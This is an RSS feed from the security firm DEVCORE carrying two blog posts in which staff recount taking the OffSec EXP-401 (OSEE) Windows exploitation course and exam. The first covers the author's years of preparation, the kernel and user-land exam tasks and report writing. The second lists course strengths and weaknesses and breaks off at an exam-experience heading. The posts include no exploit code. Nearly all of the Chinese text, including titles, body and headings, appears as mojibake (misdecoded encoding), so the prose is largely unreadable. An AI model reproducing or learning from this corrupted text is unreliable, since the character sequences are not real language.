<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
        <title>DEVCORE æˆ´å¤«å¯‡çˆ¾</title>
        <description>DEVCORE æˆ´å¤«å¯‡çˆ¾ - ç´…éšŠæ¼”ç·´æœå‹™ã€æ»²é€æ¸¬è©¦æœå‹™ã€è³‡å®‰æ•™è‚²è¨“ç·´ã€è³‡å®‰é¡§å•æœå‹™</description>
        <link>https://devco.re</link>
        <lastBuildDate>Sat, 12 Jul 2025 20:25:43 +0800</lastBuildDate>
        <pubDate>Sat, 12 Jul 2025 20:25:43 +0800</pubDate>
        <ttl>1800</ttl>
        <atom:link href="https://devco.re/rss" rel="self" type="application/rss+xml" />


        <item>
                <title>éŒ¯éäº”å¹´ï¼Œæˆ‘çµ‚æ–¼è¸é€² OSEE çš„ä¸–ç•Œ</title>
                <description>&lt;p&gt;å‰é¢æˆ‘æƒ³å·²ç¶“æœ‰è¨±å¤šç¯‡ OSEE å¿ƒå¾—äº†ï¼Œå¤šæ•¸å…§å®¹æ‡‰è©²å°±ä¸å†å¤šåšè´…è¿°ï¼Œæœ‰èˆˆè¶£çš„åŒå­¸å¯åƒè€ƒä¸‹åˆ—å¹¾ç¯‡&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/&quot;&gt;EXP-401 (OSEE)ï¼šç”¨äº”å¤©èª²ç¨‹è¨“ç·´é€šé€åå¹´çš„çŸ¥è­˜é«”ç³»&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2025/07/02/webdog-view-on-osee-advanced-windows-exploitation-from-0.1/&quot;&gt;å¾ Web ç‹—çš„è¦–è§’çœ‹ OSEE â€” å¾ 0.1 é–‹å§‹çš„ Advanced Windows Exploitation è€ƒè©¦&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2025/07/11/exp-401-course-and-second-exam-thoughts/&quot;&gt;EXP-401 èª²ç¨‹ &amp;amp;&amp;amp; ç¬¬äºŒæ¬¡è€ƒè©¦å¿ƒå¾—&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;é€™é‚Šä¸»è¦æ˜¯ä»¥å¹³å¸¸æœ‰åœ¨ç¢° Windows çš„äººçš„è§’åº¦å‡ºç™¼ã€‚è€å¯¦èªªï¼Œå¤§ç´„åœ¨ 5 å¹´å‰å°±å° OSEE é€™å¼µè­‰ç…§ç•¥æœ‰æ‰€èï¼Œè€Œç•¶æ™‚ä¹Ÿå‰›å¥½é–‹å§‹å­¸ä¸€äº› Windows Pwn çš„ç›¸é—œçŸ¥è­˜ï¼Œå‡ºä¸€äº› CTF é¡Œç›®çµ¦å¤§å®¶ç©ç©ï¼Œé †ä¾¿å¢é€² Windows çŸ¥è­˜ï¼Œç•¶æ™‚ä¹Ÿå­¸äº†ä¸€äº›æœ‰é—œ Windows Kernel çš„åˆ©ç”¨æŠ€å·§ï¼Œä¸éå‰›é–‹å§‹å­¸æ™‚ä¹Ÿè™•è™•ç¢°å£ï¼ŒèŠ±äº†å¥½ä¸€æ®µæ™‚é–“æ‰æ…¢æ…¢å­¸æœƒæ€éº¼å»å¥½å¥½æä¸€å€‹ Windows Kernel Exploitã€‚åœ¨å¾—çŸ¥æœ‰é€™å¼µè­‰ç…§ä¹‹å¾Œï¼Œä¾¿ä¸‹å®šæ±ºå¿ƒæœªä¾†æŸä¸€å¤©ä¸€å®šè¦æ‹¿åˆ°é€™å¼µè­‰ç…§ã€‚&lt;/p&gt;

&lt;p&gt;å¤§ç´„åœ¨ 2019 å·¦å³ï¼Œæ‰“ CTF æ¼¸æ¼¸çš„æä¸èµ·èˆˆè¶£ï¼Œæ…¢æ…¢çš„é–‹å§‹ç©ç©ä¸åŒçš„æ±è¥¿ï¼Œåœ¨éå¾€ CTF é¡Œç›®ä¸­ï¼ŒWindows ä¸€ç›´å¾ˆå°‘å‡ºç¾ï¼Œä½†åœ¨çœŸå¯¦ä¸–ç•Œä¸­ï¼Œå»æ˜¯éš¨è™•å¯è¦‹ï¼Œæ–¼æ˜¯ä¾¿é–‹å§‹äº†ç ”ç©¶ Windows é€™é …æ—…ç¨‹ã€‚åœ¨å‰›é–‹å§‹æ¥è§¸ Windows Pwn åŠ Windows Kernel æ™‚ï¼Œå¤šæ•¸è³‡æºéƒ½åèˆŠï¼Œå¾ˆå¤šåœ¨ Windows 10 ä¸Šå°±ä¸èƒ½é‹ä½œï¼Œåœ¨é€™ä¸€å¹´ï¼Œæˆ‘èŠ±äº†è¨±å¤šæ™‚é–“é€†å‘ï¼Œæ…¢æ…¢äº†è§£ Windows ä¸Šçš„æ¼æ´è©²æ€éº¼å»åˆ©ç”¨ï¼Œä¹Ÿå¯«äº†&lt;a href=&quot;https://www.slideshare.net/slideshow/windows-10-nt-heap-exploitation-english-version/154467191&quot;&gt;å¹¾å€‹&lt;/a&gt;&lt;a href=&quot;https://speakerdeck.com/scwuaptx/windows-kernel-heap-segment-heap-in-windows-kernel-part-1&quot;&gt;æ•™å­¸æŠ•å½±ç‰‡&lt;/a&gt;ä½œç‚ºç´€éŒ„ã€‚è€Œåœ¨ 2020 å¹´é–‹å§‹åŠ å…¥ DEVCORE ä¹‹å¾Œï¼Œæ¯ä¸€å¹´éƒ½æœƒè¨‚è‡ªå·±çš„å¹´åº¦ç›®æ¨™ï¼Œè€Œ OSEE è·Ÿåœ¨ Pwn2Own ä¸­æ”»ç ´ Windows å°±ä¸€ç›´åœ¨æˆ‘çš„ç›®æ¨™æ¸…å–®ä¸­ã€‚OSEE é€™å¼µè­‰ç…§å¾ˆç‰¹åˆ¥ï¼Œä¸€å®šå¾—é£›å»ç¾å ´ä¸Šå®Œèª²ä¹‹å¾Œæ‰èƒ½å»è€ƒè©¦ï¼Œé‚£æ™‚å€™ä¸Šèª²åœ°é»ä¹Ÿåªæœ‰ Black Hat USAï¼Œç„¶è€Œ 2020-2022 é–“ï¼Œå‰›å¥½å°±é‡ä¸Šç–«æƒ…çˆ†ç™¼ï¼Œç„¡æ³•ç›´æ¥é£›å‡ºåœ‹å»ä¸Šèª²ï¼Œè€Œæˆ‘çš„ç›®æ¨™ä¹Ÿæ¼¸æ¼¸åœ°å¾ Windows Kernel çš„æ¼æ´åˆ©ç”¨ï¼Œè½‰å¾€ Windows Kernel æ¼æ´æŒ–æ˜ã€‚ä½†åœ¨é€™å…©å¹´é–“ï¼Œå»æŒ–ä¸å¤ªåˆ°æ¼æ´ï¼Œ2022 ä¹Ÿé ‚å¤šåœ¨ &lt;a href=&quot;https://conf.devco.re/2024/keynote/DEVCORE-CONFERENCE-2024-Angelboy-LeakLess-Another-Leak-Way-in-Windows-Kernel-DFSC.pdf&quot;&gt;DFSC&lt;/a&gt; ä¸Šï¼ŒæŒ–åˆ°äº†å¹¾å€‹æ·ºè€Œæ˜“è¦‹çš„æ´ï¼Œä½†æ¥ä¸‹ä¾†å¾ˆé•·ä¸€æ®µæ™‚é–“å°±æ²’æœ‰ç”¢å‡ºäº†ã€‚é€™æ™‚ä¹Ÿé–‹å§‹è¿·æƒ˜æ˜¯ä¸æ˜¯ä¸å¤ªé©åˆæŒ– Windows Kernelï¼Œå› ç‚ºé€™å€‹åŸå›  2023 å¹´åˆæ™‚ï¼Œè®“æˆ‘æ›´æƒ³æ‹¿åˆ° OSEE é€™å¼µè­‰ç…§ï¼Œæƒ³è¦è­‰æ˜è‡ªå·±åœ¨ Windows ä¸Šï¼Œé‚„æ˜¯æœ‰ä¸€å®šçš„èƒ½åŠ›çš„ï¼Œä¸éç•¶å¹´å¯èƒ½æ˜¯ç–«æƒ…é—œä¿‚ï¼Œé‚£å¹´æ²’é–‹èª²ã€‚å¾ˆå¿«åœ°å°±ä¾†åˆ° 2024 å¹´ï¼ŒOffSec çµ‚æ–¼ä¾†åˆ°äºæ´²å€é–‹èª²äº†ï¼Œä¸¦ä¸”åœ¨å°ç£æœ‰é–‹ OSEE èª²ç¨‹ï¼Œå¤§å¹…çœä¸‹äº†æ©Ÿç¥¨è²»ï¼Œç ”ç©¶çµ„çš„å¹¾ä½å¤¥ä¼´ä¹Ÿå‰›å¥½æœ‰èˆˆè¶£å°±ä¸€èµ·å ±åäº†é€™é–€èª²ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ä¸Šèª²&quot;&gt;ä¸Šèª²&lt;/h2&gt;
&lt;p&gt;èª²ç¨‹å…§å®¹æˆ‘å°±ä¸å¤šèªªäº†ï¼Œåœ¨ &lt;a href=&quot;https://devco.re/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/&quot;&gt;EXP-401 (OSEE)ï¼šç”¨äº”å¤©èª²ç¨‹è¨“ç·´é€šé€åå¹´çš„çŸ¥è­˜é«”ç³»&lt;/a&gt; æ‡‰è©²éƒ½æœ‰è©³ç´°ä»‹ç´¹æ¯ä¸€å¤©æ‰€ä¸Šèª²çš„å…§å®¹ï¼Œé€™ç¯‡åªè‘—é‡åœ¨å€‹äººå¿ƒå¾—æ–¹é¢ã€‚&lt;/p&gt;

&lt;p&gt;æ™‚é–“å¾ˆå¿«åœ°å°±ä¾†åˆ° 2024 å¹´ 8 æœˆï¼Œäº”å¤©èª²ä¸Šä¸‹ä¾†ï¼Œä¸å¾—ä¸èªªï¼ŒçœŸçš„éå¸¸æ‰å¯¦ï¼Œå°æ–¼èª²ç¨‹å…§å®¹æˆ‘æƒ³çµ•å°å°å¾—èµ·å®ƒçš„åƒ¹éŒ¢ã€‚ä¸è«–å¾èª²ç¨‹çš„è¨­è¨ˆã€é¡Œç›®åŠè¬›å¸«ï¼Œéƒ½æœ‰éå¸¸é«˜çš„å“è³ªã€‚å¾ˆå¾Œæ‚”ç•¶åˆ 2019 æœ‰æ©Ÿæœƒå» Las Vegas æ™‚ï¼Œæ²’æœ‰å»å ±åé€™é–€èª²ï¼Œå¦‚æœç•¶åˆæœ‰å…ˆå ±é€™é–€èª²ï¼Œæˆ‘æƒ³åœ¨å¾Œé¢æ¼æ´åˆ©ç”¨æ–¹é¢å°±ä¸æœƒå¡å¤ªå¤šæ™‚é–“ï¼Œå› ç‚ºèª²ç¨‹ä¸­æåˆ°äº†è¨±è¨±å¤šå¤šæˆ‘ç•¶åˆåœ¨ç ”ç©¶ Windows æ¼æ´åˆ©ç”¨æ™‚æ‰€é‡åˆ°çš„å•é¡Œã€‚å€‹äººè¦ºå¾—ä¸Šèª²å¥½ç©çš„åœ°æ–¹ï¼Œå°±æ˜¯è·Ÿå¤§å®¶ä¸€èµ·è§£ Extra Mileï¼Œå°±å¾ˆåƒä»¥å‰å¤§å®¶åœ¨å¯« CTF ä¸€æ¨£ï¼Œæœ‰ä¸€å®šçš„æŒ‘æˆ°æ€§ï¼Œç”šè‡³æœ‰äººç‚ºäº† Coin è€Œæ•´å¤œæ²’ç¡æŠŠå®ƒè§£å®Œï¼Œä¸éæˆ‘é‚„æ˜¯å»ºè­°å¤§å®¶èªçœŸä¸Šèª²ï¼Œå¯ä»¥ç¯€çœå¾ˆå¤šçœ‹æ›¸çš„æ™‚é–“ã€‚&lt;/p&gt;

&lt;p&gt;èª²ç¨‹å…§å®¹å¦ä¸€å€‹é‡é»åŒ…æ‹¬äº†ã€Œç©©å®šçš„æ¼æ´åˆ©ç”¨ã€ï¼Œä¹Ÿéå¸¸æœ‰åƒ¹å€¼ï¼Œé€™ç®—æ˜¯ä»¥å¾€åœ¨æ‰“ CTF ä¸å¤ªæœƒæ³¨æ„çš„äº‹æƒ…ã€‚åœ¨ç¾å¯¦çš„æ¼æ´åˆ©ç”¨ä¸Šï¼Œä¸è«–æ˜¯åœ¨ç´…éšŠæˆ–æ˜¯ Pwn2Own ä¸Šï¼Œé€šå¸¸éƒ½ä¸å…è¨±ä½ å¤±æ•—ï¼Œä¸€æ—¦æ‰“å¤±æ•—å°±å¾ˆæœ‰å¯èƒ½ BSoD æˆ–æ˜¯æœå‹™ä¸­æ–·ï¼Œè€Œé€™é–€èª²ä¹Ÿå¾ˆé‡è¦–é€™ä¸€é»ï¼Œç®—æ˜¯æˆ‘åœ¨é€™å€‘èª²ä¸­æ‰€å­¸åˆ°æœ€å¤šçš„éƒ¨åˆ†ã€‚&lt;/p&gt;

&lt;h2 id=&quot;è€ƒè©¦&quot;&gt;è€ƒè©¦&lt;/h2&gt;

&lt;p&gt;è€å¯¦èªªï¼Œå®‰æ’å®Œè€ƒè©¦å¾Œï¼Œå…¶å¯¦é‚„è »æ“”å¿ƒæœƒä¸æœƒè€ƒä¸éï¼Œå¦‚æœå¹³å¸¸éƒ½æœ‰åœ¨ç¢° Windows é‚„è€ƒä¸éï¼Œå¯èƒ½å°±æ˜¯æˆ‘çš„å•é¡Œäº†ã€‚ä½†å‰›å¥½é‚£æ®µæ™‚é–“ä¹Ÿåœ¨æº–å‚™ OffensiveCon æ¼”è¬›ï¼Œå¯¦åœ¨æ²’å¤ªå¤šæ™‚é–“æº–å‚™ï¼Œå¤šæ•¸é‚„æ˜¯é é€™å¹¾å¹´ç©ä¸‹ä¾†çš„åŸºç¤ä¾†è€ƒè©¦ï¼Œå¦å¤–é€™ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡è€ƒ OffSec ç³»åˆ—çš„è­‰ç…§ï¼Œé›£å…ä¹Ÿæœƒå„ç¨®æ“”å¿ƒï¼Œæœƒæ“”å¿ƒæˆ‘æœƒä¸æœƒçœ‹ä¸æ‡‚é¡Œç›®è¦å¹¹å˜›ï¼Œå ±å‘Šæœƒä¸æœƒå¯«å¤ªçˆ›ç­‰ç­‰çš„ã€‚&lt;/p&gt;

&lt;p&gt;æ™‚é–“å¾ˆå¿«åœ°å°±ä¾†åˆ°äº† 2025-05-31 05:00ï¼Œæ™‚é–“å¯¦åœ¨ä¸æ˜¯å¾ˆå¥½ï¼Œè…¦è¢‹é‚„æ˜¯å¾ˆæ˜æ²‰çš„ç‹€æ…‹ï¼Œå…‰æ˜¯ç’°å¢ƒè¨­å®šå°±å¼„äº†ä¸€å°æ™‚ã€‚è€Œé¡Œç›®å°±å¦‚&lt;a href=&quot;https://offensive-security.com/awe/AWE-Exam-Report.docx&quot;&gt;å®˜æ–¹ç¯„ä¾‹å ±å‘Š&lt;/a&gt;ä¸­æ‰€è¿°ï¼Œåˆ†åˆ¥å°±æ˜¯ User Land è·Ÿ Kernel Land çš„é¡Œç›®ã€‚ç”±æ–¼å¹³å¸¸éƒ½åœ¨ç¢° Windows Kernelï¼Œæˆ‘å°±æ±ºå®šå…ˆè§£é€™é¡Œï¼Œä¸éå› ç‚ºå¤ªå¸¸ç¢°äº†ï¼Œä¸€çœ‹å°±çŸ¥é“é¡Œç›®è¦åšå•¥ï¼Œé›–ç„¶ä¸­é–“è‡ªå·± Exploit å¯«éŒ¯æ²’ç™¼ç¾å¤šèŠ±äº†ä¸€é»æ™‚é–“ï¼Œç´„èŠ± 3 å€‹å°æ™‚æ‰æå®šã€‚&lt;/p&gt;

&lt;p&gt;è€Œå¦å¤–ä¸€æ User Land çš„é¡Œç›®å‰‡ç›¸å°éº»ç…©ä¸€é»ï¼Œé™¤äº†è¦ Code Execution é‚„è¦ Sandbox Escapeï¼Œä¹Ÿå¿…é ˆå¯«å‡ºä¸ä¾è³´ä»»ä½•ç‰ˆæœ¬çš„æ¼æ´åˆ©ç”¨ï¼Œé¡Œç›®æ•˜è¿°å¾ˆæ¸…æ¥šï¼Œè€Œé¡Œç›®ä¸­ä¹Ÿæœƒæœ‰ä¸€äº›å¼•å°å¹«åŠ©ä½ è§£é¡Œï¼Œä½ æœƒå¾ˆæ¸…æ¥šçš„çŸ¥é“ä¸‹ä¸€æ­¥è©²åšç”šéº¼ï¼Œåªè¦ä½ ä¸€æ­¥ä¸€æ­¥æ…¢æ…¢ä¾†å°±å¯ä»¥å®Œæˆã€‚å…¶å¯¦é€™é¡Œå°±å¾ˆåƒåœ¨æ‰“ CTF é¡Œç›®ï¼Œé€™é¡Œæˆ‘å¤§æ¦‚èŠ±äº† 16 å°æ™‚å·¦å³è§£æ±ºå¾Œï¼Œå°±å»ç¡è¦ºäº†ã€‚&lt;/p&gt;

&lt;p&gt;è€Œéš”å¤©é†’ä¾†å¾Œå°±é–‹å§‹å¯«å ±å‘Šäº†ï¼Œé€™æ™‚å€™æˆ‘ä¸¦æ²’æœ‰ç«‹å³çµæŸè€ƒè©¦ï¼Œå› ç‚ºè€ƒè©¦å¿…é ˆè¦ä¸€æ­¥ä¸€æ­¥æˆªåœ–ï¼Œæ‰€ä»¥æˆ‘é‚„æ˜¯è·Ÿè‘—æ˜¨å¤©çš„æ­¥é©Ÿæ…¢æ…¢å¯«å ±å‘Šï¼Œæˆªå®Œæ‰€éœ€è¦çš„åœ–ï¼Œå ±å‘Šå¯«å®Œå¾Œæ‰çµæŸè€ƒã€‚ç”±æ–¼å‰é¢æœ‰å› ç‚ºå ±å‘Šæ²’æœ‰éçš„å…ˆä¾‹ï¼Œé€™ä»½æˆ‘å¯«çš„ç‰¹åˆ¥èªçœŸï¼Œä¹ŸèŠ±äº† 16 å°æ™‚å¯«é€™ä»½å ±å‘Šï¼Œç¸½é æ•¸å¯«å®Œå¤§æ¦‚æœ‰ 256 é å§ã€‚&lt;/p&gt;

&lt;p&gt;è€ƒå®Œè©¦ä¹‹å¾Œï¼Œå¤§æ¦‚ä¸€é€±å¾Œå°±é †åˆ©æ”¶åˆ°é€šéçš„é€šçŸ¥ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250712/08cbcbee694010404a3f73dbda56c960.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é¡Œå¤–è©±ï¼Œå¾Œä¾†ä¹Ÿå’Œé€šéçš„åŒå­¸å€‘èŠä¸€ä¸‹é¡Œç›®ï¼Œç™¼ç¾åŸä¾†æˆ‘çœ‹éŒ¯é¡Œç›®äº†ï¼Œå…¶å¯¦&lt;strong&gt;ä¸éœ€è¦&lt;/strong&gt;å¯«å‡ºä¸ä¾è³´ä»»ä½•ç‰ˆæœ¬çš„æ¼æ´åˆ©ç”¨ â€¦â€¦&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;é¡Œç›®è¨˜å¾—çœ‹æ¸…æ¥šä¸€é»ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;çµèª&quot;&gt;çµèª&lt;/h2&gt;

&lt;p&gt;æƒ³è€ƒäº”å¹´çš„ OSEE ç¸½ç®—å…¥æ‰‹äº†ï¼Œç¸½ç®—å®Œæˆäº†ä¸€ç›´æ“ºåœ¨é å®šæ¸…å–®ï¼Œå»ä¸€ç›´æ²’æœ‰å®Œæˆçš„é …ç›®ã€‚&lt;/p&gt;

&lt;p&gt;é€™å¹¾å¹´å¾ˆå¸¸è½åˆ°å¤§å®¶èªª OSEE å¾ˆé›£ã€å¾ˆè²´ï¼Œå¯¦éš›ä¸Šä¾†èªªï¼Œå¦‚æœå¹³å¸¸æœ‰åœ¨æ‰“ CTF Pwn é¡Œæˆ–å°æ–¼ Binary æœ‰ä¸€å®šç¨‹åº¦äº†è§£çš„äººï¼Œæˆ‘æƒ³æ‡‰è©²æ²’ç”šéº¼å•é¡Œï¼Œå¯ä»¥ç›´æ¥ä¸Šèª²ï¼Œè€ƒè©¦ç¨å¾®è¤‡ç¿’ä¸€ä¸‹å³å¯ã€‚è€Œå¦‚æœå¹³å¸¸å¾ˆå°‘ç¢° Binary æˆ–æ¼æ´åˆ©ç”¨ï¼Œå»ºè­°å¯ä»¥å…ˆå­¸ç¿’ä¸€ä¸‹ OSED çš„å…§å®¹ï¼Œæˆ‘è¦ºå¾—è‡³å°‘è¦æœƒæ‰‹å‹•ç–Šå‡º ROP æœƒæ¯”è¼ƒé©åˆä¸€é»ã€‚ä¸éï¼Œæ¯”èµ·è€ƒè©¦ï¼Œé€™é–€åƒ¹å€¼å¤šæ•¸é‚„æ˜¯åœ¨èª²ç¨‹ä¸Šï¼Œå¦‚æœä½ æƒ³å­¸ç¿’ Windows æ¼æ´åˆ©ç”¨ã€æƒ³çŸ¥é“å¤–é¢ APT çµ„ç¹”éƒ½æ˜¯å¦‚ä½•åˆ©ç”¨é€™äº›æ¼æ´ï¼Œé‚„æœ‰çœ‹æ‡‚ä»–å€‘æ˜¯æ€éº¼å»åˆ©ç”¨çš„ï¼Œæˆ‘æƒ³é€™é–€èª²æ‡‰è©²éå¸¸é©åˆä½ ã€‚&lt;/p&gt;

&lt;p&gt;è€Œä»Šå¹´ DEVCORE ä¹Ÿæœ‰ç¹¼çºŒæ¨å‡º OSEEï¼Œæ©Ÿæœƒé›£å¾—ï¼Œå¯ä»¥çœä¸‹ä¸å°‘æ©Ÿç¥¨éŒ¢ä¹Ÿä¸éœ€è¦èª¿æ™‚å·®ï¼Œå¦‚æœæœ‰èˆˆè¶£çš„åŒå­¸å¯ä»¥å¥½å¥½æŠŠæ¡æ©Ÿæœƒï¼Œè©³ç´°å…§å®¹å¯åƒè€ƒ &lt;a href=&quot;https://training.devco.re/2025&quot;&gt;https://training.devco.re/2025&lt;/a&gt;ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2025/07/12/finally-stepping-into-the-world-of-osee-after-five-years/</link>
                <guid>https://devco.re/blog/2025/07/12/finally-stepping-into-the-world-of-osee-after-five-years</guid>
                <pubDate>Sat, 12 Jul 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>EXP-401 èª²ç¨‹ && ç¬¬äºŒæ¬¡è€ƒè©¦å¿ƒå¾—</title>
                <description>&lt;p&gt;ã€Œ&lt;a href=&quot;/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/&quot;&gt;EXP-401 (OSEE)ï¼šç”¨äº”å¤©èª²ç¨‹è¨“ç·´é€šé€åå¹´çš„çŸ¥è­˜é«”ç³»&lt;/a&gt;ã€ä¸€æ–‡ä¸­å·²ç¶“å°‡ EXP-401 èª²ç¨‹å…§å®¹ä½œäº†è©³ç´°çš„ä»‹ç´¹ï¼Œè€Œæˆ‘å°±æ˜¯é‚£å€‹è§£å‡ºé¡Œç›®ã€å»å› å› ç‚ºå ±å‘Šä¸å¤ è©³ç›¡è€Œè¢«åˆ¤å®šæ²’éçš„å­¸å“¡ï¼Œå› ç‚ºä¸Šä¸€ç¯‡æ–‡ç« è¬›äº†å¾ˆå¤šèª²ç¨‹å…§å®¹ï¼Œé€™ç¯‡æ–‡ç« æ¯”è¼ƒåå‘å€‹äººå¿ƒå¾—åŠé›œé …ç¢å¿µã€‚ï¼ˆé‚„æœ‰è³¼è²· exam retake çš„éç¨‹ï¼‰&lt;/p&gt;

&lt;h2 id=&quot;å¿ƒå¾—&quot;&gt;å¿ƒå¾—&lt;/h2&gt;

&lt;p&gt;èª²ç¨‹å…§å®¹å’Œæ•™æå°±ä¸ç´°è¬›äº†ï¼Œé€™ç¯‡æœƒæ›´æ³¨é‡åœ¨ä¸åŒé ˜åŸŸç²å¾—çš„æ–°çŸ¥ã€‚&lt;/p&gt;

&lt;p&gt;VMware éƒ¨åˆ†è®“æˆ‘å­¸åˆ°å°ä¸€å€‹çœ‹èµ·ä¾†å¾ˆé›£çš„ç›®æ¨™è¦æ€éº¼å»é–‹å§‹ï¼Œå…ˆå¾ RPC é–‹å§‹ï¼Œç„¶å¾Œäº†è§£è¨˜æ†¶é«”å¸ƒå±€ï¼Œè§¸ç™¼æ¼æ´ä¸¦åˆ©ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;Edge éƒ¨åˆ†å­¸åˆ°å…©ç¨®ä¸åŒçš„ç¨‹å¼èªè¨€å¦‚ä½•å»äº¤äº’ã€‚&lt;/p&gt;

&lt;p&gt;Kernel éƒ¨åˆ†ï¼Œå¦‚æœæ²’æœ‰ç ”ç©¶ Windows æ ¸å¿ƒæ¼æ´çš„ç¶“é©—ï¼Œèª²ç¨‹ä¸€é–‹å§‹æœƒæœ‰å¾ˆå¤šä¸ç­è§£çš„åœ°æ–¹ã€‚é€™æ˜¯éå¸¸æ­£å¸¸çš„ï¼Œä¸ç”¨å¤ªæ“”å¿ƒã€‚æ‰€æœ‰ç ”ç©¶å“¡çš„å­¸ç¿’æ›²ç·šéƒ½æ˜¯å¾åˆå­¸è€…ä¸€é–‹å§‹ä½¿ç”¨åˆ¥äººçš„æ¼æ´åˆ©ç”¨ç¨‹å¼ï¼Œå°æ¼æ´é€æ¼¸äº†è§£ã€ç ”ç©¶çš„æ·±åº¦é€æ¼¸å¢åŠ ï¼Œåˆ°å¯ä»¥å®Œæˆè‡ªå·±çš„ exploit chainï¼Œè€Œ Windows ç ”ç©¶çš„æœ€å¾Œä¸€å“©è·¯å°±æ˜¯æ ¸å¿ƒæ¼æ´åˆ©ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;å€‹äººç¶“é©—è€Œè¨€ï¼Œé›–ç„¶åœ¨ä¸Šèª²å‰å·²ç¶“è€ƒé EXP-301ï¼ˆOSEDï¼‰ï¼Œä½†æ˜¯æ²’æœ‰å¤šå°‘ Windows Kernel çš„ç¶“é©—ï¼Œè—‰ç”±å¾ªåºæ¼¸é€²çš„èª²ç¨‹è¨­è¨ˆï¼Œæœƒæ…¢æ…¢äº†è§£æ ¸å¿ƒåˆ©ç”¨çš„æœ‰è¶£ä¹‹è™•ã€‚æœ€å¾Œäº†è§£ Kernel çµæ§‹æˆå“¡å¾Œï¼Œå¯ä»¥æˆåŠŸåˆ©ç”¨æ¼æ´æˆ–æ ¸å¿ƒé‚è¼¯ææ¬Šã€‚&lt;/p&gt;

&lt;p&gt;å…¶ä»–å„ªé»ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;èª²ç¨‹ä¸ŠæåŠçš„ä¸»é¡Œåœ¨æ•™æä¸Šç›¸ç•¶å®Œæ•´ï¼Œæ¯ä¸€å€‹å°æ­¥é©Ÿéƒ½æœ‰ Sample Codeã€‚&lt;/li&gt;
  &lt;li&gt;æ•™æå¾ªåºæ¼¸é€²è¬›è§£é‡è¦è§€å¿µï¼Œç”šè‡³æœ‰åŒ…å«æ€è·¯ä¸­å¯èƒ½çš„è©¦èª¤éç¨‹ï¼Œè®“ä½ çŸ¥é“ç‚ºä»€éº¼é€™æ¨£åšä¸èƒ½æˆåŠŸåˆ©ç”¨æ¼æ´ã€å“ªä¸€æ­¥å¯èƒ½å‡ºéŒ¯ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å…¶ä»–ç¼ºé»ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Edge ç€è¦½å™¨çš„ç ”ç©¶è·Ÿåˆ©ç”¨åœç•™åœ¨ Chakra å¼•æ“ï¼Œè€Œç¾åœ¨çš„èˆŠå¼•æ“å·²è¢« Chromium å–ä»£ã€‚&lt;/li&gt;
  &lt;li&gt;åœ¨è™›æ“¬å®‰å…¨æ€§ VBS ç’°å¢ƒä¸Šæœ‰å¯è§£æ±ºçš„å°å•é¡Œï¼Œæ­¤å•é¡Œåœ¨ç•¶æ™‚çš„ç¶²é ä¸¦æœªæåŠã€‚&lt;/li&gt;
  &lt;li&gt;æ²’æœ‰å¯¦é«”çš„è­‰æ›¸åŠå¡ç‰‡ã€‚åœ¨é€™å€‹é›»è…¦ç¶²è·¯åŒ–çš„æ™‚ä»£ï¼Œå€‹äººè¦ºå¾—å¯¦é«”å°åˆ·çš„è­‰æ›¸åŠå¡ç‰‡æ›´æœ‰ç´€å¿µåƒ¹å€¼ã€‚å¾ &lt;a href=&quot;https://www.google.com/search?q=oscp+card&amp;amp;udm=2&amp;amp;sa=X&quot;&gt;Google&lt;/a&gt; ä¹Ÿèƒ½æ‰¾åˆ°è¨±å¤šä»¥å‰çš„ç…§ç‰‡ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è‡³æ–¼é€™é–€èª²ç¨‹çš„é©åˆå°è±¡ï¼Œèˆ‡ Nini çš„æ„Ÿæƒ³é¡ä¼¼ï¼Œé©åˆæƒ³æŒ‘æˆ°è‡ªå·±ã€æˆ–æƒ³æ‹“å±•çŸ¥è­˜é«”ç³»çš„äººã€‚å¤§å‹ä¼æ¥­ã€å…¬å¸ä¸¦ä¸ä¸€å®šæœƒæœ‰äº†è§£æˆ–éœ€è¦æ­¤æŠ€è¡“çš„éœ€æ±‚ã€‚ä½†æ˜¯èª²ç¨‹å­¸åˆ°çš„çŸ¥è­˜å¯ä»¥æ‹“å±•åˆ°å…¶ä»–æ–¹é¢ï¼Œå¦‚ Windows æƒ¡æ„ç¨‹å¼åˆ†æç­‰ã€‚&lt;/p&gt;

&lt;h2 id=&quot;è€ƒè©¦å¿ƒå¾—&quot;&gt;è€ƒè©¦å¿ƒå¾—ï¼š&lt;/h2&gt;

